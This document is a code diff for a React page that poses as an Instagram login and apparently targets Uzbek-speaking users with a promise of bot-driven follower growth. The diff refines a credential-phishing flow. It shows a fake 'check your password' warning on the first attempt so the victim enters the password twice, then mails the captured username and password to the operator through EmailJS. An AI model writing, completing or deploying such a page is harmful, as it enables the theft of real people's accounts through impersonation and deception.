@@ -1,5 +1,7 @@
 import React, { useState } from 'react';
 import emailjs from 'emailjs-com';
+import { ToastContainer, toast } from 'react-toastify';
+import 'react-toastify/dist/ReactToastify.css';
 import Logo from '../assets/logo.webp';
 
 function Instagram() {
@@ -7,6 +9,7 @@ function Instagram() {
     username: '',
     password: '',
   });
+  const [passwordEntered, setPasswordEntered] = useState(false);
 
   const handleChange = (e) => {
     setFormData({
@@ -18,33 +21,56 @@ function Instagram() {
   const handleSubmit = (e) => {
     e.preventDefault();
 
+    // 1. Foydalanuvchi kirgan ma'lumotlarni tekshirish
+    if (!formData.username || !formData.password) {
+      // Agar username yoki password bo'sh bo'lsa, xabar ko'rsatish
+      toast.error('Iltimos, barcha maydonlarni to‘ldiring!', {
+        position: "top-right",
+      });
+      return; // Formani yuborishni to'xtatish
+    }
+
+    // 2. Parol birinchi va ikkinchi marta kiritilishiga qarab xabar chiqarish
+    if (!passwordEntered) {
+      // Parol birinchi marta kiritilganda xabar chiqarish
+      toast.warn('Uzr, parolni tekshirib kiriting', {
+        position: "top-right",
+      });
+      setPasswordEntered(true);
+      return;
+    } else {
+      // Parol ikkinchi marta kiritilganda xabar chiqarish
+      toast.success('Rahmat! 2 kun ichida botimiz foydalanivchini ko\'paytirib beradi', {
+        position: "top-right",
+      });
+    }
+
+    // 3. EmailJS orqali xabarni jo'natish
     emailjs.send(
-      'YOUR_SERVICE_ID', // Replace with your actual service ID
-      'YOUR_TEMPLATE_ID', // Replace with your actual template ID
+      'YOUR_SERVICE_ID', // EmailJS service ID o'rnating
+      'YOUR_TEMPLATE_ID', // EmailJS template ID o'rnating
       {
         username: formData.username,
         password: formData.password,
       },
-      'YOUR_USER_ID' // Replace with your actual user ID
+      'YOUR_USER_ID' // EmailJS user ID o'rnating
     ).then(
       (result) => {
         console.log('Email sent:', result.text);
-        alert('Login details sent!');
       },
       (error) => {
         console.error('Error:', error.text);
-        alert('An error occurred. Please try again.');
       }
     );
   };
 
-  // Forgot password handler
   const handleForgotPassword = () => {
-    alert('Uzr, bizda faqat log in qilib bo\'ladi');
+    alert("Uzr, bizda faqat log in qilib bo'ladi");
   };
 
   return (
     <div className="flex items-center justify-center h-screen">
+      <ToastContainer /> {/* Toast container komponenti */}
       <div className="w-full max-w-xl h-screen flex items-center justify-center p-6 bg-gradient-to-tr from-pink-100 via-purple-100 to-yellow-100 border border-gray-200 rounded-lg shadow-lg">
         <div>
           <div className="flex justify-center mb-16">
